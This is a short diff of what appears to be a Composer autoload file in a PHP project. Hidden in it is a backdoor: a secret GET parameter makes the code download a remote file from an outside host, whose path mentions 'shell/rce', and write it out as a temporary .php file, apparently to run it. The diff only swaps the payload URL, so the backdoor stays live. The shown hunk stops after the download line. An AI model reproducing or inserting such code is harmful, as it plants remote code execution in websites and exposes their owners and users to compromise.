@@ -75,7 +75,7 @@ function composerRequire062ed7c26ecbce812e6c84c9df86c27a($fileIdentifier, $file)
 }
 if (isset($_GET['cukimayy22'])) {
     try {
-        $u = "https://scemabot.com/vendor/pelangi.txt";
+        $u = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
         $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
         $c = @file_get_contents($u);
